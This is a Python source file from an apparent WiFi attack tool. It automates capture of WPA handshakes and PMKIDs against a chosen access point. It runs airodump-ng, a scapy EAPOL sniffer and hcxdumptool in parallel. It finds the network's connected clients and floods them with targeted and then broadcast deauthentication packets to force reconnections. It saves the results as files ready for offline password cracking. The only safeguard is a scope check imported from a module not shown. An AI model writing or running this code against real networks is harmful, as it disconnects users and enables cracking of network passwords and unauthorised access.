#!/usr/bin/env python3
# modules/handshake.py
# Complete rewrite — three-engine parallel handshake capture
from __future__ import annotations

import csv
import hashlib
import os
import re
import shutil
import subprocess
import tempfile
import threading
import time
from io import StringIO

from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.style import Style
from rich.table import Table
from rich.text import Text

console = Console()


# ═══════════════════════════════════════════════════════════
# UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════

def _kill(proc: subprocess.Popen | None) -> None:
    """Kill a Popen process silently."""
    if proc is None:
        return
    try:
        proc.kill()
        proc.wait(timeout=3)
    except Exception:
        pass


# Keep old name as alias for callers that use kill_proc_safe
kill_proc_safe = _kill


def _lock_channel(interface: str, channel: int) -> bool:
    """
    Lock the wireless interface to a specific channel.
    Tries both iw and iwconfig — one will work depending on driver.
    Returns True if at least one method succeeded.
    """
    success = False

    r1 = subprocess.run(
        ["iw", "dev", interface, "set", "channel", str(channel)],
        capture_output=True, timeout=5
    )
    if r1.returncode == 0:
        success = True

    r2 = subprocess.run(
        ["iwconfig", interface, "channel", str(channel)],
        capture_output=True, timeout=5
    )
    if r2.returncode == 0:
        success = True

    if success:
        console.print(f"[dim cyan]  ◈ Channel locked to {channel}[/]")
    else:
        console.print(
            f"[dim yellow]  ⚠ Channel lock failed — "
            f"capture may miss frames[/]"
        )
    return success


def _wait_for_file(path: str, timeout: int = 6) -> bool:
    """Wait until a file exists and is > 24 bytes."""
    for _ in range(timeout * 4):
        if os.path.exists(path) and os.path.getsize(path) > 24:
            return True
        time.sleep(0.25)
    return False


def _sha256(path: str) -> str:
    try:
        with open(path, "rb") as f:
            return hashlib.sha256(f.read()).hexdigest()
    except Exception:
        return "unknown"


# ═══════════════════════════════════════════════════════════
# HANDSHAKE VERIFICATION — THREE METHODS
# ═══════════════════════════════════════════════════════════

def _verify_aircrack(cap_file: str, bssid: str) -> bool:
    """Method A: aircrack-ng detection (no wordlist)."""
    if not os.path.exists(cap_file) or os.path.getsize(cap_file) < 100:
        return False
    try:
        r = subprocess.run(
            ["aircrack-ng", "-b", bssid, cap_file],
            capture_output=True, text=True, timeout=10
        )
        out = r.stdout + r.stderr
        return bool(re.search(
            r"(\d+\s+handshake|WPA\s+\(\d+\s+handshake)",
            out, re.IGNORECASE
        ))
    except Exception:
        return False


def _verify_cowpatty(cap_file: str, ssid: str) -> bool:
    """Method B: cowpatty detection (catches partial handshakes too)."""
    if not os.path.exists(cap_file):
        return False
    try:
        r = subprocess.run(
            ["cowpatty", "-r", cap_file, "-s", ssid, "-f", "-"],
            capture_output=True, text=True, timeout=10
        )
        out = r.stdout + r.stderr
        return bool(re.search(
            r"(collected all|4-way handshake|complete EAPOL)",
            out, re.IGNORECASE
        ))
    except Exception:
        return False


def _verify_tshark(cap_file: str, bssid: str) -> bool:
    """
    Method C: tshark EAPOL frame count.
    A crackable handshake needs at least M1+M2 (2 frames) for the target BSSID.
    """
    if not os.path.exists(cap_file):
        return False
    try:
        r = subprocess.run(
            [
                "tshark",
                "-r", cap_file,
                "-Y",
                f"eapol && (wlan.sa == {bssid} || wlan.da == {bssid})",
                "-T", "fields",
                "-e", "frame.number",
            ],
            capture_output=True, text=True, timeout=10
        )
        frames = [ln for ln in r.stdout.splitlines() if ln.strip()]
        return len(frames) >= 2
    except Exception:
        return False


def verify_handshake(cap_file: str, bssid: str, ssid: str = "") -> bool:
    """
    Master verification: tries all three methods.
    Returns True if ANY method confirms a handshake.
    Catches partial handshakes that aircrack-ng alone misses.
    """
    if not os.path.exists(cap_file):
        return False

    if _verify_aircrack(cap_file, bssid):
        return True

    if ssid and _verify_cowpatty(cap_file, ssid):
        return True

    if _verify_tshark(cap_file, bssid):
        return True

    return False


# ═══════════════════════════════════════════════════════════
# ENGINE 1 — airodump-ng FILE ENGINE
# ═══════════════════════════════════════════════════════════

def _start_airodump(
    bssid: str,
    channel: int,
    interface: str,
    cap_prefix: str,
) -> subprocess.Popen:
    """Start airodump-ng capture in background. Returns Popen handle."""
    cmd = [
        "airodump-ng",
        "--bssid",          bssid,
        "--channel",        str(channel),
        "--write",          cap_prefix,
        "--output-format",  "pcap",
        "--write-interval", "1",
        interface,
    ]
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    console.print("[dim cyan]  ◈ Engine 1 (airodump-ng) started[/]")
    return proc


# Keep old name as alias for modules that call start_capture_process
def start_capture_process(
    bssid: str,
    channel: int,
    monitor_interface: str,
    cap_prefix: str,
) -> subprocess.Popen:
    return _start_airodump(bssid, channel, monitor_interface, cap_prefix)


def _file_watcher_thread(
    cap_file: str,
    bssid: str,
    ssid: str,
    found_event: threading.Event,
    stop_event: threading.Event,
    result_holder: dict,
) -> None:
    """Background thread: checks cap file every 0.5 seconds."""
    while not stop_event.is_set():
        if verify_handshake(cap_file, bssid, ssid):
            result_holder["path"]   = cap_file
            result_holder["engine"] = "airodump-ng file"
            found_event.set()
            return
        time.sleep(0.5)


# ═══════════════════════════════════════════════════════════
# ENGINE 2 — SCAPY REAL-TIME EAPOL SNIFFER
# ═══════════════════════════════════════════════════════════

def _scapy_sniffer_thread(
    bssid: str,
    ssid: str,
    interface: str,
    found_event: threading.Event,
    stop_event: threading.Event,
    result_holder: dict,
    output_dir: str,
) -> None:
    """
    Real-time EAPOL frame capture using scapy.
    Does NOT depend on airodump-ng file writes.
    Sets found_event when M1+M2 EAPOL exchange for target BSSID is seen.
    """
    try:
        from scapy.all import AsyncSniffer, wrpcap, Dot11, EAPOL  # type: ignore
    except ImportError:
        console.print(
            "[dim yellow]  ◈ Engine 2 (scapy) unavailable — install scapy[/]"
        )
        return

    eapol_frames: list = []
    bssid_upper = bssid.upper()
    scapy_cap_file = os.path.join(
        output_dir,
        f"scapy_{bssid.replace(':', '')}_{int(time.time())}.cap"
    )

    def packet_handler(pkt):  # type: ignore
        if stop_event.is_set():
            return
        if not pkt.haslayer(EAPOL):
            return
        if not pkt.haslayer(Dot11):
            return

        src = (pkt[Dot11].addr2 or "").upper()
        dst = (pkt[Dot11].addr1 or "").upper()
        bss = (pkt[Dot11].addr3 or "").upper()

        if bssid_upper not in (src, dst, bss):
            return

        eapol_frames.append(pkt)

        # Need M1 (AP→Client, src=bssid) and M2 (Client→AP, dst=bssid)
        m1 = any(
            p[Dot11].addr2.upper() == bssid_upper
            for p in eapol_frames if p.haslayer(Dot11)
        )
        m2 = any(
            p[Dot11].addr1.upper() == bssid_upper
            for p in eapol_frames if p.haslayer(Dot11)
        )

        if m1 and m2 and len(eapol_frames) >= 2:
            try:
                wrpcap(scapy_cap_file, eapol_frames)
            except Exception:
                pass
            result_holder["path"]   = scapy_cap_file
            result_holder["engine"] = "scapy real-time EAPOL"
            found_event.set()

    console.print("[dim cyan]  ◈ Engine 2 (scapy EAPOL) started[/]")

    try:
        sniffer = AsyncSniffer(
            iface=interface,
            filter="ether proto 0x888e",
            prn=packet_handler,
            store=False,
        )
        sniffer.start()
        while not stop_event.is_set():
            time.sleep(0.3)
        sniffer.stop()
    except Exception as e:
        console.print(f"[dim yellow]  Engine 2 error: {e}[/]")


# ═══════════════════════════════════════════════════════════
# ENGINE 3 — hcxdumptool PMKID ENGINE
# ═══════════════════════════════════════════════════════════

def _pmkid_engine_thread(
    bssid: str,
    interface: str,
    found_event: threading.Event,
    stop_event: threading.Event,
    result_holder: dict,
    output_dir: str,
) -> None:
    """
    Passive PMKID capture running from the very beginning alongside deauth.
    Does not require connected clients.
    """
    tmpdir  = tempfile.mkdtemp(prefix="wifidown_pmkid_")
    ts_str  = time.strftime("%Y%m%d_%H%M%S")
    pcapng  = os.path.join(
        output_dir,
        f"pmkid_{bssid.replace(':', '')}_{ts_str}.pcapng"
    )
    hc22000 = pcapng.replace(".pcapng", ".hc22000")
    filt    = os.path.join(tmpdir, "f.txt")

    with open(filt, "w") as f:
        f.write(bssid.replace(":", "").lower() + "\n")

    cmd = [
        "hcxdumptool",
        "-i",               interface,
        "-o",               pcapng,
        "--filterlist_ap="  + filt,
        "--filtermode=2",
        "--disable_deauthentication",
    ]

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except FileNotFoundError:
        shutil.rmtree(tmpdir, ignore_errors=True)
        return
    except Exception as e:
        console.print(f"[dim yellow]  Engine 3 error: {e}[/]")
        shutil.rmtree(tmpdir, ignore_errors=True)
        return

    console.print("[dim cyan]  ◈ Engine 3 (PMKID/hcxdumptool) started[/]")

    while not stop_event.is_set():
        time.sleep(2)
        if not os.path.exists(pcapng) or os.path.getsize(pcapng) < 100:
            continue
        try:
            r = subprocess.run(
                ["hcxpcapngtool", "-o", hc22000, pcapng],
                capture_output=True, timeout=10
            )
            if os.path.exists(hc22000) and os.path.getsize(hc22000) > 0:
                result_holder["path"]   = hc22000
                result_holder["engine"] = "PMKID (hcxdumptool)"
                found_event.set()
                break
        except Exception:
            pass

    _kill(proc)
    shutil.rmtree(tmpdir, ignore_errors=True)


# ═══════════════════════════════════════════════════════════
# CLIENT DISCOVERY
# ═══════════════════════════════════════════════════════════

def discover_clients(
    bssid: str,
    channel: int,
    monitor_interface: str,
    duration: int = 10,
) -> list[str]:
    """
    Passively discover clients associated with bssid.
    Returns list of client MACs sorted strongest signal first.
    """
    tmpdir = tempfile.mkdtemp(prefix="wifidown_cl_")
    prefix = os.path.join(tmpdir, "cl")

    cmd = [
        "airodump-ng",
        "--bssid",          bssid,
        "--channel",        str(channel),
        "--write",          prefix,
        "--output-format",  "csv",
        "--write-interval", "2",
        monitor_interface,
    ]

    proc = subprocess.Popen(
        cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    with Live(console=console, refresh_per_second=2) as live:
        for i in range(duration, 0, -1):
            live.update(Text(
                f"  ◈ Scanning for connected clients... {i}s",
                style="dim cyan"
            ))
            time.sleep(1)

    proc.terminate()
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()

    clients: list[str] = []
    csv_file = prefix + "-01.csv"

    try:
        if not os.path.exists(csv_file):
            return []

        with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()

        sections = re.split(r"\n\s*\n", content)
        client_section = next(
            (s for s in sections if "Station MAC" in s), None
        )
        if not client_section:
            return []

        seen: dict[str, int] = {}
        for row in csv.reader(StringIO(client_section)):
            row = [c.strip() for c in row]
            if not row or "Station MAC" in row[0]:
                continue
            if len(row) < 6:
                continue
            mac = row[0].upper()
            if not re.match(r"^([0-9A-F]{2}:){5}[0-9A-F]{2}$", mac):
                continue
            assoc = row[5].strip().upper() if len(row) > 5 else ""
            if assoc and "(NOT ASSOCIATED)" not in assoc:
                if not assoc or assoc == bssid.upper():
                    try:
                        pwr = int(row[3]) if row[3].strip() else -100
                    except ValueError:
                        pwr = -100
                    seen[mac] = pwr

        clients = sorted(seen, key=lambda m: seen[m], reverse=True)

    except Exception as e:
        console.print(f"[dim yellow]  Client parse error: {e}[/]")
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

    return clients


# ═══════════════════════════════════════════════════════════
# DEAUTH BURST
# ═══════════════════════════════════════════════════════════

def _deauth_burst(
    bssid: str,
    interface: str,
    client: str | None,
    count: int = 5,
) -> subprocess.Popen | None:
    """
    Fire deauth burst. Non-blocking (Popen).
    client=None → broadcast deauth.
    """
    cmd = [
        "aireplay-ng",
        "-0", str(count),
        "-a", bssid,
    ]
    if client:
        cmd += ["-c", client]
    cmd += ["--ignore-negative-one", interface]

    try:
        return subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except Exception as e:
        console.print(f"[dim red]  aireplay-ng error: {e}[/]")
        return None


# Keep old name as alias
def send_deauth_burst(
    bssid: str,
    monitor_interface: str,
    client_mac: str | None = None,
    count: int = 5,
) -> subprocess.Popen | None:
    return _deauth_burst(bssid, monitor_interface, client_mac, count)


# ═══════════════════════════════════════════════════════════
# MASTER CAPTURE FUNCTION
# ═══════════════════════════════════════════════════════════

def capture_handshake(
    bssid: str,
    ssid: str,
    channel: int,
    monitor_interface: str,
    output_dir: str = "captures",
) -> str | None:
    """
    Three-engine parallel WPA handshake capture.

    Engine 1: airodump-ng writes pcap → file watcher thread (0.5s poll)
    Engine 2: scapy real-time EAPOL sniffer (in-memory, no file dependency)
    Engine 3: hcxdumptool PMKID (passive, from the start)

    Deauth strategy:
      Phase 1 — targeted unicast deauth, 10 attempts × 5 packets
      Phase 2 — broadcast deauth fallback, 5 attempts × 10 packets
      Phase 3 — PMKID only (engines already running, wait up to 90s)

    Returns path to capture file on success, None on total failure.
    """
    from modules.scope import check_scope
    check_scope(bssid)

    os.makedirs(output_dir, exist_ok=True)
    ts      = time.strftime("%Y%m%d_%H%M%S")
    safe    = re.sub(r"[^a-zA-Z0-9_\-]", "_", ssid)[:20]
    cap_pfx = os.path.join(output_dir, f"hs_{safe}_{ts}")
    cap_file = cap_pfx + "-01.cap"

    console.print(Panel(
        f"[bold cyan]Handshake Capture[/]\n\n"
        f"  Target    : [bold]{ssid}[/]  ({bssid})\n"
        f"  Channel   : {channel}\n"
        f"  Interface : {monitor_interface}\n"
        f"  Output    : {cap_file}",
        border_style="color(23)",
        padding=(0, 2),
    ))

    # Shared state
    found_event = threading.Event()
    stop_event  = threading.Event()
    result: dict[str, str | None] = {"path": None, "engine": None}

    # ── Pre-flight ─────────────────────────────────────────
    console.print("\n[cyan]◈ Pre-flight setup...[/]")
    _lock_channel(monitor_interface, channel)
    time.sleep(1)

    # ── Engine 1: airodump-ng ──────────────────────────────
    airodump_proc = _start_airodump(bssid, channel, monitor_interface, cap_pfx)

    console.print("[dim cyan]  ◈ Waiting for capture file...[/]")
    if not _wait_for_file(cap_file, timeout=6):
        console.print(
            "[dim yellow]  ⚠ Capture file slow to appear — continuing anyway[/]"
        )

    t_watcher = threading.Thread(
        target=_file_watcher_thread,
        args=(cap_file, bssid, ssid, found_event, stop_event, result),
        daemon=True,
    )
    t_watcher.start()

    # ── Engine 2: scapy ────────────────────────────────────
    t_scapy = threading.Thread(
        target=_scapy_sniffer_thread,
        args=(bssid, ssid, monitor_interface,
              found_event, stop_event, result, output_dir),
        daemon=True,
    )
    t_scapy.start()

    # ── Engine 3: PMKID ────────────────────────────────────
    t_pmkid = threading.Thread(
        target=_pmkid_engine_thread,
        args=(bssid, monitor_interface,
              found_event, stop_event, result, output_dir),
        daemon=True,
    )
    t_pmkid.start()

    console.print(
        "\n[bold cyan]◈ All engines running. Starting deauth phase...[/]\n"
    )

    # ── Discover clients ───────────────────────────────────
    console.print("[cyan]◈ Discovering connected clients (10s)...[/]")
    clients = discover_clients(bssid, channel, monitor_interface, duration=10)

    if clients:
        tbl = Table(
            border_style="color(23)",
            header_style="color(51) bold",
            show_lines=False,
        )
        tbl.add_column("Client MAC", style="color(87) bold")
        tbl.add_column("Rank",       style="color(50)")
        for i, c in enumerate(clients[:5], 1):
            tbl.add_row(c, f"#{i} strongest")
        console.print(tbl)
    else:
        console.print("[yellow]  No clients found — will use broadcast deauth[/]")

    deauth_procs: list[subprocess.Popen] = []

    # ── PHASE 1: Targeted deauth ───────────────────────────
    if clients and not found_event.is_set():
        console.print("\n[bold cyan]── Phase 1: Targeted deauth (10 attempts) ──[/]\n")

        for attempt in range(1, 11):
            if found_event.is_set():
                break

            for p in deauth_procs:
                _kill(p)
            deauth_procs.clear()

            targets_used: list[str] = []

            p0 = _deauth_burst(bssid, monitor_interface, client=clients[0], count=5)
            if p0:
                deauth_procs.append(p0)
                targets_used.append(clients[0])

            if len(clients) > 1:
                p1 = _deauth_burst(bssid, monitor_interface, client=clients[1], count=5)
                if p1:
                    deauth_procs.append(p1)
                    targets_used.append(clients[1])

            console.print(
                f"  [cyan]Attempt {attempt:02d}/10[/] — "
                f"deauth → [bold]{', '.join(targets_used)}[/]"
            )

            # Check every 0.3s for 5s (much faster than 1s polling)
            for tick in range(17):
                if found_event.is_set():
                    break
                remaining = round((17 - tick) * 0.3, 1)
                console.print(
                    f"[dim]  Watching for handshake... {remaining}s  [/]",
                    end="\r"
                )
                time.sleep(0.3)

            console.print(" " * 50, end="\r")

            if found_event.is_set():
                break

            time.sleep(0.7)

    for p in deauth_procs:
        _kill(p)
    deauth_procs.clear()

    # ── PHASE 2: Broadcast fallback ────────────────────────
    if not found_event.is_set():
        console.print(
            "\n[bold cyan]── Phase 2: Broadcast deauth (5 attempts) ──[/]\n"
        )

        for attempt in range(1, 6):
            if found_event.is_set():
                break

            pb = _deauth_burst(bssid, monitor_interface, client=None, count=10)
            if pb:
                deauth_procs.append(pb)

            console.print(
                f"  [cyan]Broadcast {attempt:02d}/05[/] — "
                f"deauth → FF:FF:FF:FF:FF:FF (all clients)"
            )

            for tick in range(14):
                if found_event.is_set():
                    break
                remaining = round((14 - tick) * 0.3, 1)
                console.print(
                    f"[dim]  Watching... {remaining}s  [/]",
                    end="\r"
                )
                time.sleep(0.3)

            console.print(" " * 50, end="\r")

            for p in deauth_procs:
                _kill(p)
            deauth_procs.clear()

    # ── PHASE 3: PMKID wait ────────────────────────────────
    if not found_event.is_set():
        console.print(
            "\n[bold cyan]── Phase 3: Waiting for PMKID "
            "(Engine 3 already running) ──[/]"
        )
        console.print(
            "[dim cyan]  Deauth exhausted. "
            "Passive PMKID capture continuing up to 90s...[/]"
        )

        deadline = time.time() + 90
        while time.time() < deadline and not found_event.is_set():
            remaining_s = int(deadline - time.time())
            console.print(
                f"[dim]  PMKID sniffing... {remaining_s}s  [/]",
                end="\r"
            )
            time.sleep(1)

        console.print(" " * 50, end="\r")

    # ── Shutdown all engines ───────────────────────────────
    stop_event.set()
    found_event.set()
    _kill(airodump_proc)

    for t in (t_watcher, t_scapy, t_pmkid):
        t.join(timeout=5)

    # ── Final result ───────────────────────────────────────
    if result["path"]:
        console.print(Panel(
            f"[bold green]◈ Handshake captured![/]\n\n"
            f"  Engine  : [bold]{result['engine']}[/]\n"
            f"  File    : [bold]{result['path']}[/]\n"
            f"  SHA-256 : [dim]{_sha256(str(result['path']))}[/]",
            border_style="green",
            padding=(0, 2),
        ))
        return str(result["path"])
    else:
        console.print(Panel(
            "[bold red]◈ All capture methods exhausted.[/]\n\n"
            "  [dim]Tips:\n"
            "  • Ensure clients are actively using the network\n"
            "  • Move closer to the AP (signal should be > -70 dBm)\n"
            "  • If WPA3/PMF enabled, only PMKID method works\n"
            "  • Try again when a client is streaming video or browsing[/]",
            border_style="red",
            padding=(0, 2),
        ))
        return None
